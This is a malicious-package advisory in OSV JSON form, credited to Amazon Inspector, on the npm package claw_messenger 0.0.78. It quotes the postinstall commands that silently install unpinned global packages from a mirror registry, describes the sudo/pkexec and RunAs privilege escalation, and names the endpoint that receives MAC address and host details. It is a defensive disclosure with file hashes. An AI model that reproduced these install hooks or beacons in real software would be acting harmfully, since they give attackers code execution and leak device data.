@@ -1,0 +1,85 @@
+{
+  "modified": "2026-06-12T19:07:36Z",
+  "published": "2026-06-12T19:07:36Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "postinstall silently installs unrelated global npm packages from a non-default registry and triggers privilege escalation",
+  "details": "On `npm install`, the postinstall lifecycle script (dist/postinstall.js) silently spawns `npm install -g opencode-ai --registry=https://registry.npmmirror.com` as a detached child with `stdio: 'ignore'` and `windowsHide: true`. `opencode-ai` is not declared anywhere in package.json, is not mentioned in the README, has no version pin, and is fetched from a non-default registry — installers receive whatever `opencode-ai` happens to resolve to on npmmirror at install time. A second postinstall path runs `update-silent-service.js` → `setupService()` (dist/service-installer.js:42, dist/daemon-manager.js:46), which executes `npm install -g claw-subagent-service@latest` (unpinned) and then escalates privileges to register a system service: `pkexec`/`sudo` on Linux (dist/service-installer.js:131) and PowerShell `Start-Process -Verb RunAs` on Windows. None of this is gated by user consent at install time. Independently, when the plugin is loaded, dist/auto-register.js POSTs the device's MAC address (read from `/sys/class/net/eth0/address` or `ifconfig en0`), hostname, platform, arch, memory, and CPU info to a hardcoded `https://newsradar.dreamdt.cn/im/api/claw/register` endpoint that does not match the stated publisher `github.com/quukk`. The combination of silent unpinned third-party global install from a non-default registry, automatic privilege escalation, and a publisher-mismatched device-fingerprint beacon constitutes install-time RCE surface — the publisher of `opencode-ai` (and any future compromise of `claw-subagent-service@latest`) gains code execution on every machine that installs `claw_messenger`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "claw_messenger"
+      },
+      "versions": [
+        "0.0.78"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/postinstall.js",
+              "sha256": "f674ec5133eeb19081eca906a37311e205b712ed7db7c804149b7a6e3530a560",
+              "tlsh": "3541312a45ea01771f4389991d0b943f272216029158f124facecf5f1793e3d89932fe"
+            },
+            {
+              "path": "dist/service-installer.js",
+              "sha256": "c0c647a4557b7b1f09067888c54213392ba3837cc5f9b129710e4d7bcaf07073",
+              "tlsh": "fff11e8915f316385a73f8addb8b801a22265003500edf48fe9da6645f9336867f1be9"
+            },
+            {
+              "path": "dist/auto-register.js",
+              "sha256": "0d0acd44d14b8579e0cad4a335cd48e027bbdb8a0edca48a3548b1dd2532dbc8",
+              "tlsh": "891274d6adfb142e02526859cb5f50247214be872748c458fbccc6d4bfa4914e9a3bf8"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "claw_messenger-0.0.78.tgz",
+              "hashes": {
+                "sha1": "ce127c99e777f51fbc8f635df58e4af06fd5c712",
+                "sha512_sri": "sha512-Mqf45ECoPTfqIZJOcsFL1o3Buh8RUPdBi5zJ44eMHSYSK7T0OHzImunPoizfuf+gagqtfL8MU86UBZxtXEvH/Q=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.78"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "0885941bc4a25f1e6e9fa5f780621448b6af28241d783929c12e6fa32c6d40de",
+        "import_time": "2026-06-12T19:44:00.445585523Z",
+        "id": "IN-MAL-2026-006033",
+        "modified_time": "2026-06-12T19:07:36Z",
+        "versions": [
+          "0.0.78"
+        ]
+      }
+    ]
+  }
+}
